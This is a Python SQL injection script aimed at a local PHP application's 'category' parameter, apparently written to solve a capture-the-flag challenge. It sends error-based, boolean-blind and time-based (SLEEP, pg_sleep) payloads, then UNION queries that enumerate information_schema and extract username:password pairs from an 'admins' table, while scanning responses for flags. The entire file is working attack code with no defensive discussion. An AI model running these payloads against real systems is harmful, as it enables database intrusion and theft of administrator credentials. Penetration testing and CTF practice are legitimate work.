import urllib.request
import urllib.parse
import time

# Configuration
cookie_value = "8993d695eb127fdc823416d1f8ee85ae"
base_url = "http://127.0.0.1:33164/index.php"

# Helper function for requests
def make_request(category_value, timeout=15):
    try:
        # Build URL with parameters
        url = f"{base_url}?category={urllib.parse.quote(category_value)}"
        
        # Create request with headers and cookie
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0")
        req.add_header("Cookie", f"PHPSESSID={cookie_value}")
        
        start = time.time()
        with urllib.request.urlopen(req, timeout=timeout) as response:
            content = response.read().decode('utf-8', errors='ignore')
            elapsed = time.time() - start
            status = response.status
            return status, len(content), content, elapsed
            
    except Exception as e:
        return "ERROR", 0, str(e)[:100], 0

print("SQL Injection Testing - Category Parameter")
print("=" * 60)

# Get baseline
print("\n[1] Getting baseline response...")
status, length, content, elapsed = make_request("Nature")
baseline_length = length
print(f"Baseline: Status={status}, Length={length}B")

# Test 1: Error-based SQL Injection
print("\n[2] Testing error-based SQL injection...")
error_payloads = [
    "Nature' OR '1'='1--",
    "Nature' AND '1'='2--",
    "Tech' UNION SELECT 1,2,3,4,5--",
    "Science' UNION SELECT 1--"
]

for payload in error_payloads:
    status, length, content, elapsed = make_request(payload)
    diff = length - baseline_length
    
    print(f"\nPayload: {payload}")
    print(f"  Status: {status}, Length: {length}B, Diff: {diff:+d}B")
    
    if "SQL" in content.upper() or "error" in content.lower() or "syntax" in content.lower():
        print(f"  -> SQL ERROR DETECTED")
        print(f"  -> Snippet: {content[:300]}")
    elif length > baseline_length + 100:
        print(f"  -> LARGE RESPONSE - DATA EXTRACTED")
        print(f"  -> Snippet: {content[:300]}")
    elif "FLAG{" in content:
        flag_start = content.find("FLAG{")
        flag_end = content.find("}", flag_start)
        flag = content[flag_start:flag_end+1]
        print(f"  -> FLAG FOUND: {flag}")
        print(f"  -> Near snippet: {content[flag_start-50:flag_end+50]}")

# Test 2: Boolean-based Blind Injection
print("\n[3] Testing boolean-based blind injection...")
true_payload = "Nature' AND 1=1--"
false_payload = "Nature' AND 1=2--"

status_true, len_true, content_true, elapsed = make_request(true_payload)
status_false, len_false, content_false, elapsed = make_request(false_payload)

print(f"True:  {true_payload}")
print(f"  -> Length: {len_true}B")
print(f"False: {false_payload}")
print(f"  -> Length: {len_false}B")

if len_true != len_false:
    print(f"-> BOOLEAN INJECTION DETECTED! Diff={abs(len_true-len_false)}B")
else:
    print(f"-> No difference in responses")

# Test 3: Time-based Blind Injection
print("\n[4] Testing time-based blind injection...")
sleep_payloads = ["Nature' AND SLEEP(5)--", "Nature' AND pg_sleep(5)--"]

for payload in sleep_payloads:
    status, length, content, elapsed = make_request(payload, timeout=20)
    print(f"\nPayload: {payload}")
    print(f"  Time: {elapsed:.2f}s")
    
    if elapsed > 4.5:
        print(f"  -> TIME DELAY DETECTED!")
        print(f"  -> This suggests time-based SQL injection is possible")

# Test 4: Data Extraction
print("\n[5] Testing data extraction...")
extraction_payloads = [
    "Nature' UNION SELECT table_name FROM information_schema.tables LIMIT 5--",
    "Nature' UNION SELECT column_name FROM information_schema.columns WHERE table_name='admins'--",
    "Nature' UNION SELECT concat(username,':',password) FROM admins LIMIT 5--"
]

for payload in extraction_payloads:
    status, length, content, elapsed = make_request(payload, timeout=20)
    diff = length - baseline_length
    
    print(f"\nPayload: {payload[:60]}...")
    print(f"  Status: {status}, Length: {length}B, Diff: {diff:+d}B")
    
    if length > baseline_length + 50:
        print(f"  -> DATA EXTRACTED!")
        print(f"  -> Response: {content[:500]}")
        
        # Look for admin credentials
        if "admin" in content.lower():
            print(f"  -> ADMIN DATA FOUND!")
        
        # Look for flag
        if "FLAG{" in content:
            flag_start = content.find("FLAG{")
            flag_end = content.find("}", flag_start)
            flag = content[flag_start:flag_end+1]
            print(f"  -> FLAG FOUND: {flag}")

print("\n" + "=" * 60)
